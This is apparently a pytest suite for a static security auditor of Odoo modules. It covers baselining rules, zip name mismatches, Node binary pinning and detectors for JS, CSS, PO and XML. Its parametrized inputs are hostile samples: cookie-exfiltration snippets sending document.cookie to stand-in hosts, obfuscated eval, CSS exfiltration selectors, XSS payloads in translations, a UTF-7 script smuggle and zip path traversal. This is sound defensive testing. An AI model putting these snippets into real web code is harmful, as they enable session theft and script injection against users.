"""BOT-CODE-AUDIT-4: gate baselining (L1), zip directory mismatch (L2), review findings."""

from __future__ import annotations

import io
import zipfile

import pytest

from app.bots import code_audit as ca
from app.bots import module_test_gate as mtg
from app.bots import owned_change as oc
from app.bots.owned_change import ChangeError, ChangeRequest, Edit

MOD = "ing_demo"
MANIFEST = (
    b"{'name': 'D', 'version': '17.0.1.0.0', 'depends': ['base'], 'license': 'LGPL-3', 'data': []}"
)
BASE = {"__manifest__.py": MANIFEST, "__init__.py": b"", "README.md": b"x\n"}
BIG = ca.MAX_FILE + 10


def _zip(files: dict[str, bytes], root: str = MOD) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        for p, b in files.items():
            z.writestr(f"{root}/{p}", b)
    return buf.getvalue()


# --- L1: unaudited findings are never baselined -------------------------------------


@pytest.mark.parametrize("ext", ["py", "js", "xml", "bin"])
def test_l1_gate_blocks_modified_oversized_file(ext):
    old = BASE | {f"big.{ext}": b"#" * BIG}
    new = BASE | {f"big.{ext}": b"#" * (BIG - 1) + b"\n"}
    chk = mtg._audit(new, old, MOD, 17)
    assert chk.status == mtg.FAIL and "file-unaudited" in (chk.log or "")


def test_l1_gate_blocks_even_unchanged_oversized_file():
    # same bytes in base and new still prove nothing: the file was never read
    files = BASE | {"big.py": b"#" * BIG}
    assert mtg._audit(files, dict(files), MOD, 17).status == mtg.FAIL


def test_l1_gate_still_baselines_ordinary_findings():
    py = b"def f(env):\n    return env['res.users'].sudo()\n"
    files = BASE | {"m.py": py}
    assert mtg._audit(files | {"README.md": b"y\n"}, files, MOD, 17).status == mtg.PASS


@pytest.mark.parametrize("code", sorted(ca.UNBASELINABLE))
def test_l1_unbaselinable_codes_exist_in_auditor(code):
    import inspect

    assert f'"{code}"' in inspect.getsource(ca), code


def test_l1_owned_change_refuses_when_module_has_unaudited_file(tmp_path):
    root = tmp_path / MOD
    for p, b in (BASE | {"big.py": b"#" * BIG}).items():
        (root / p).parent.mkdir(parents=True, exist_ok=True)
        (root / p).write_bytes(b)
    with pytest.raises(ChangeError) as e:
        oc.build_change_set(
            root,
            ChangeRequest(MOD, (Edit("README.md", "add_file", "y\n"),)),
            version=17,
            owned_names={MOD},
        )
    assert e.value.code == "source-unsafe"  # refused before any baseline


@pytest.mark.parametrize(
    "path,body",
    [
        ("lib/x.so", b"\x7fELF\x00\x00"),
        ("tools/run.sh", b"#!/bin/sh\necho hi\n"),
        ("data/dump.sql", b"DELETE FROM res_users;\n"),
        ("static/x.wasm", b"\x00asm\x01\x00\x00\x00"),
    ],
)
def test_l1_owned_change_never_baselines_unaudited(tmp_path, path, body):
    root = tmp_path / MOD
    for p, b in (BASE | {path: body}).items():
        (root / p).parent.mkdir(parents=True, exist_ok=True)
        (root / p).write_bytes(b)
    with pytest.raises(ChangeError) as e:
        oc.build_change_set(
            root,
            ChangeRequest(MOD, (Edit("notes.md", "add_file", "y\n"),)),
            version=17,
            owned_names={MOD},
        )
    assert e.value.code == "audit-regression"


# --- L2: zip local header vs central directory ------------------------------------


def _mismatched(central: str, local: str) -> bytes:
    assert len(central) == len(local)
    data = bytearray(_zip(BASE | {central: b"x = 1\n"}))
    i = data.find(b"PK\x03\x04" + b"")
    # rewrite only the first local header carrying the name; the central record keeps it
    pos = data.find(f"{MOD}/{central}".encode())
    assert 0 <= pos < data.rfind(b"PK\x01\x02") and i >= 0
    data[pos : pos + len(MOD) + 1 + len(local)] = f"{MOD}/{local}".encode()
    return bytes(data)


@pytest.mark.parametrize(
    "central,local",
    [("models/a.py", "models/b.py"), ("safe.md", "evil.py"), ("ok/a.py", "../a.py")],
)
def test_l2_zip_name_mismatch_fails_closed(central, local):
    if len(central) != len(local):
        pytest.skip("length")
    r = ca.audit(_mismatched(central, local), version=17, module_name=MOD)
    assert not r.ok and r.error and not r.findings


# --- M4: Node binary + full dynamic-library closure pinned; executed from a private copy --


def _pin_doc():
    import json

    from app.bots import code_audit_web as web

    return web, json.loads(web.NODE_PIN.read_text())


def test_m4_pin_covers_library_closure():
    web, pin = _pin_doc()
    if web._pin() is None:
        pytest.skip("node not pinned on this host")
    assert pin["libs"] and pin["libs_sha256"]
    assert all(not p.startswith(("/usr/lib/", "/System/")) for p in pin["libs"])


@pytest.mark.parametrize("mutate", ["drop_libs", "lib_hash", "bin_hash", "extra_lib"])
def test_m4_changed_pin_fails_closed(tmp_path, monkeypatch, mutate):
    import json

    web, pin = _pin_doc()
    if web._pin() is None:
        pytest.skip("node not pinned on this host")
    if mutate == "drop_libs":
        pin.pop("libs")
    elif mutate == "lib_hash":
        pin["libs_sha256"] = "0" * 64
    elif mutate == "bin_hash":
        pin["sha256"] = "0" * 64
    else:
        fake = tmp_path / "libevil.dylib"
        fake.write_bytes(b"x")
        pin["libs"].append(str(fake))
    p = tmp_path / "node.pin.json"
    p.write_text(json.dumps(pin))
    monkeypatch.setattr(web, "NODE_PIN", p)
    assert web._node() is None
    assert web.run([("a.js", "js", "x = 1")]) == "Node.js binary changed since pinning" or (
        isinstance(web.run([("a.js", "js", "x = 1")]), str)
    )


def test_m4_runs_private_copy(monkeypatch):
    web, _ = _pin_doc()
    if web.helper_problem():
        pytest.skip("helper unavailable")
    seen = []
    real = web._run_batch
    monkeypatch.setattr(
        web, "_run_batch", lambda node, d, b: seen.append((node, d)) or real(node, d, b)
    )
    res = web.run([("a.js", "js", "x = 1")])
    assert isinstance(res, dict) and res["a.js"]["ok"]
    node, d = seen[0]
    assert node.startswith(str(web.NODE_CACHE_ROOT)) and node.endswith("/bin/node")


# --- JS / CSS helper: H8-H11, M3, fixpoint summaries, ts/tsx/jsx/sass ---------------


def _web(kind: str, text: str) -> set[tuple[str, str]]:
    from app.bots import code_audit_web as web

    if web.helper_problem():
        pytest.skip("parser helper unavailable on this host")
    r = web.run([("f", kind, text)])["f"]
    assert r["ok"], r
    return {(f["sev"], f["code"]) for f in r["findings"]}


@pytest.mark.parametrize(
    "kind,src,want",
    [
        # H9: eval / Function as a value
        ("js", "Reflect.apply(eval, null, [s])", ("high", "js-eval")),
        ("js", "const e = [eval][0]; e(s)", ("high", "js-eval")),
        ("js", "eval.call(null, s)", ("high", "js-eval")),
        ("js", "run(Function, s)", ("high", "js-eval")),
        ("js", "const f = window['ev' + 'al']; f(s)", ("high", "js-eval")),
        # H10: folded member names, document alias, cookie-holding variables
        (
            "js",
            "const d=document; const c=d['coo'+'kie']; fetch('https://e.v/?'+c)",
            ("high", "js-cookie-leak"),
        ),
        (
            "js",
            "const k='coo'+'kie'; const v=document[k]; new Image().src='//e.v/'+v",
            ("high", "js-cookie-leak"),
        ),
        (
            "js",
            "let a = document.cookie; let b = a; navigator.sendBeacon('/x', b)",
            ("high", "js-cookie-leak"),
        ),
        # M3: style URLs and Worker blobs
        (
            "js",
            "el.style.backgroundImage='url(//ext/'+document.cookie+')'",
            ("high", "js-cookie-leak"),
        ),
        (
            "js",
            "el.style.setProperty('background', 'url(//e/' + document.cookie + ')')",
            ("high", "js-cookie-leak"),
        ),
        ("js", "new Worker(URL.createObjectURL(new Blob([s])))", ("high", "js-eval")),
        ("js", "new SharedWorker('data:text/javascript,' + s)", ("high", "js-eval")),
        ("js", "new Worker(u)", ("medium", "js-script-load")),
        ("js", "el.style.background = 'url(https://e.v/x.png)'", ("medium", "js-external-request")),
        # JS fixpoint summaries (3 levels, methods, HTML sinks)
        (
            "js",
            "function a(s){eval(s)} function b(t){a(t)} function c(u){b(u)} c(location.hash)",
            ("high", "js-flow-sink"),
        ),
        ("js", "const o = { r(x) { el.innerHTML = x } }; o.r(data)", ("medium", "js-flow-sink")),
        ("js", "class K { go(x) { setTimeout(x) } } new K().go(data)", ("high", "js-flow-sink")),
        # H8: OWL inline templates
        ("js", "const T = xml`<div t-out='markup(props.html)'/>`", ("high", "owl-t-out")),
        ("js", "const T = xml`<span t-out='props.label'/>`", ("medium", "owl-t-out")),
        # H11: CSS escapes and @use/@forward
        ("css", "a{background:\\75rl(https://e.v/a)}", ("medium", "css-external-url")),
        ("css", "a{background:u\\72l(https://e.v/a)}", ("medium", "css-external-url")),
        ("scss", "@use 'https://e.v/x';", ("high", "css-external-import")),
        ("scss", "@forward 'https://e.v/x';", ("high", "css-external-import")),
        ("css", "a{background:url(\\6a avascript:alert(1))}", ("high", "css-expression")),
        # typed sources and indented Sass are parsed, not skipped
        (
            "ts",
            "const x: string = document.cookie; fetch('https://e.v/' + x)",
            ("high", "js-cookie-leak"),
        ),
        ("tsx", "const A = (p: any) => <div />; eval(p as string)", ("high", "js-eval")),
        ("jsx", "const A = () => <a href={u} />; eval(s)", ("high", "js-eval")),
        ("sass", "a\n  background: url(https://e.v/a)\n", ("medium", "css-external-url")),
        ("sass", "@import 'https://e.v/x'\n", ("high", "css-external-import")),
        ("sass", 'a[value^="a"]\n  background: url(https://e.v/a)\n', ("high", "css-exfiltration")),
        ("sass", "a\n  background: \\75rl(https://e.v/a)\n", ("medium", "css-external-url")),
    ],
)
def test_web_findings(kind, src, want):
    assert want in _web(kind, src), (src, _web(kind, src))


@pytest.mark.parametrize(
    "kind,src",
    [
        (
            "js",
            "if (typeof eval === 'function') {}; x instanceof Function; Function.prototype.bind",
        ),
        ("js", "function a(s){eval(s)} a('1+1')"),  # constant argument: only the eval itself
        ("js", "const T = xml`<b t-out='\"x\"'/><i t-out='markup(\"<b/>\")'/>`"),
        ("sass", "=m\n  color: red\n.x\n  +m\n  &:hover\n    color: blue\n"),
    ],
)
def test_web_quiet_variants(kind, src):
    got = _web(kind, src)
    assert not {x for x in got if x[1] in ("js-flow-sink", "owl-t-out", "css-external-url")}, got
    if "typeof" in src:
        assert not got


@pytest.mark.parametrize("kind,src", [("ts", "const = ;"), ("css", "@\\69mport url(x")])
def test_web_unparseable_fails_closed(kind, src):
    from app.bots import code_audit_web as web

    if web.helper_problem():
        pytest.skip("parser helper unavailable on this host")
    assert not web.run([("f", kind, src)])["f"]["ok"]


@pytest.mark.parametrize("ext", ["ts", "tsx", "jsx", "sass"])
def test_typed_sources_are_audited_in_modules(ext):
    from app.bots import code_audit_web as web

    if web.helper_problem():
        pytest.skip("parser helper unavailable on this host")
    body = b"a\n  background: url(https://e.v/a)\n" if ext == "sass" else b"eval(location.hash)\n"
    r = ca.audit(_zip(BASE | {f"static/src/x.{ext}": body}), version=17, module_name=MOD)
    codes = {(f.severity, f.code) for f in r.findings if f.file.endswith(ext)}
    assert codes & {("high", "js-eval"), ("medium", "css-external-url")}, codes


# --- H8 in static XML (Python side) -------------------------------------------------


@pytest.mark.parametrize(
    "tpl,sev",
    [
        ('<t t-name="x"><div t-out="markup(props.html)"/></t>', "high"),
        ('<t t-name="x"><div t-out="props.record.data.note"/></t>', "medium"),
        ('<t t-name="x"><div t-out="\'fixed\'"/></t>', None),
        ('<t t-name="x"><div t-out="markup(\'&lt;b/&gt;\')"/></t>', None),
    ],
)
def test_h8_owl_static_xml(tpl, sev):
    xml = f'<?xml version="1.0"?><templates>{tpl}</templates>'.encode()
    r = ca.audit(_zip(BASE | {"static/src/x.xml": xml}), version=17, module_name=MOD)
    got = {f.severity for f in r.findings if f.code == "owl-t-out"}
    assert got == ({sev} if sev else set()), r.findings
    # OWL expressions are JavaScript: never run through the Python safe_eval audit
    assert not [f for f in r.findings if f.code in ("unsafe-expression", "expression-call")]


# --- .po structural model ---------------------------------------------------------


def _po(msgid: str, msgstr: str) -> set[tuple[str, str]]:
    po = f'msgid ""\nmsgstr ""\n\nmsgid "{msgid}"\nmsgstr "{msgstr}"\n'.encode()
    r = ca.audit(_zip(BASE | {"i18n/fr.po": po}), version=17, module_name=MOD)
    return {(f.severity, f.code) for f in r.findings if f.file == "i18n/fr.po"}


@pytest.mark.parametrize(
    "msgid,msgstr,want",
    [
        ("Hello", "<img src=x onerror=alert(1)>", ("high", "po-markup-injection")),
        ("<b>Hi</b>", "<b onclick=x>Salut</b>", ("high", "po-markup-injection")),
        ("<a href='/x'>Go</a>", "<a href='//evil.example'>Va</a>", ("medium", "po-markup-change")),
        ("Hi", "<b>Salut</b>", ("medium", "po-markup-change")),
        (
            "<span class='a'>Hi</span>",
            "<span class='a' style='x'>Salut</span>",
            ("medium", "po-markup-change"),
        ),
        ("Hi", "<!-- x -->Salut", ("medium", "po-markup-change")),
    ],
)
def test_po_structure_flags(msgid, msgstr, want):
    assert want in _po(msgid, msgstr)


@pytest.mark.parametrize(
    "msgid,msgstr",
    [
        ("<b>Hi</b>", "<b>Salut</b>"),
        ("<span title='Hello'>Hi</span>", "<span title='Bonjour'>Salut</span>"),
        ("Hi &amp; bye", "Salut &amp; au revoir"),
        ("Hi", "Salut &lt;script&gt;"),
    ],
)
def test_po_structure_quiet(msgid, msgstr):
    assert not _po(msgid, msgstr)


# --- M6: severity split on stock-like patterns ----------------------------------------


def _xml(body: str) -> list:
    xml = f'<?xml version="1.0"?><odoo>{body}</odoo>'.encode()
    files = BASE | {"views/v.xml": xml}
    files["__manifest__.py"] = MANIFEST.replace(b"'data': []", b"'data': ['views/v.xml']")
    return ca.audit(_zip(files), version=17, module_name=MOD).findings


@pytest.mark.parametrize(
    "attr,sev",
    [
        ("t-attf-onclick=\"location.href='#{url}';\"", "medium"),  # hole inside a JS string
        ('t-attf-onclick="go(#{url})"', "high"),  # hole in code
        ("t-attf-onclick=\"go('#{a}', #{b})\"", "high"),  # one hole in code
        ('t-att-onclick="handler"', "high"),
        ('onclick="go()"', "medium"),
    ],
)
def test_m6_inline_handler_split(attr, sev):
    fs = _xml(f'<template id="t"><button {attr}>x</button></template>')
    assert {f.severity for f in fs if f.code == "qweb-inline-handler"} == {sev}


@pytest.mark.parametrize(
    "fn,sev",
    [
        (
            '<function model="ir.model.data" name="_update_xmlids"><value model="base" eval="'
            f"[{{'xml_id': '{MOD}.a', 'record': obj().env.ref('{MOD}.b')}}]\"/></function>",
            "medium",
        ),
        (
            '<function model="ir.model.data" name="_update_xmlids"><value model="base" eval="'
            "[{'xml_id': 'base.group_system', 'record': x}]\"/></function>",
            "high",
        ),
        (
            '<function model="ir.module.module" name="_generate_primary_snippet_templates">'
            f"<value eval=\"[ref('base.module_{MOD}')]\"/></function>",
            "medium",
        ),
        (
            '<function model="ir.module.module" name="button_immediate_uninstall">'
            "<value eval=\"[ref('base.module_crm')]\"/></function>",
            "high",
        ),
    ],
)
def test_m6_function_on_own_records(fn, sev):
    fs = _xml(fn)
    assert {f.severity for f in fs if f.code == "xml-function-call"} == {sev}


def test_h9_owl_prop_schema_is_not_eval():
    src = (
        "class A { static props = { onClick: Function, cb: { type: Function, optional: true },"
        " any: [Function, Object] }; }\nA.props = { f: Function };\n"
    )
    assert not {x for x in _web("js", src) if x[1] == "js-eval"}
    assert ("high", "js-eval") in _web("js", "const o = { f: Function }; o.f('x')()")


# ---- CODE-AUDIT-5 (review 4) ----
def test_r4_m2_every_unaudited_or_incomplete_code_is_unbaselinable():
    import re as _re
    from pathlib import Path as _P

    base = _P(ca.__file__).parent
    srcs = [
        base / "code_audit.py",
        base / "code_audit_web.py",
        base / "code_audit_js" / "audit.mjs",
    ]
    codes = set()
    for f in srcs:
        codes |= set(
            _re.findall(r"[\"']([a-z]+(?:-[a-z]+)*-(?:unaudited|incomplete))[\"']", f.read_text())
        )
    assert {"js-flow-incomplete", "web-unaudited", "flow-incomplete", "po-unaudited"} <= codes
    assert all(ca.unbaselinable(x) for x in codes)
    assert not ca.unbaselinable("sql-injection")


def test_r4_m6_po_utf7_refused_and_utf8_ok():
    po7 = (
        'msgid ""\nmsgstr ""\n"Content-Type: text/plain; charset=UTF-7\\n"\n\n'
        'msgid "Hi"\nmsgstr "+ADw-script+AD4-"\n'
    )
    r = ca.audit(_zip({"i18n/fr.po": po7}), version=17)
    assert any(f.code == "po-unaudited" and f.severity == ca.HIGH for f in r.findings)
    ok = po7.replace("UTF-7", "UTF-8").replace("+ADw-script+AD4-", "Salut")
    r = ca.audit(_zip({"i18n/fr.po": ok}), version=17)
    assert not any(f.code.startswith("po-") for f in r.findings)


def test_r4_m6_coffee_styl_unaudited_is_high_and_dts_audited():
    r = ca.audit(
        _zip({"static/src/a.coffee": "x = 1", "static/src/a.styl": "a\n  b c"}), version=17
    )
    sev = {f.file: f.severity for f in r.findings if f.code == "web-unaudited"}
    assert sev == {"static/src/a.coffee": ca.HIGH, "static/src/a.styl": ca.HIGH}
    r = ca.audit(
        _zip({"static/src/a.d.ts": "declare const x: number;\neval(location.hash)\n"}), version=17
    )
    assert any(f.severity == ca.HIGH for f in r.findings if f.file == "static/src/a.d.ts")
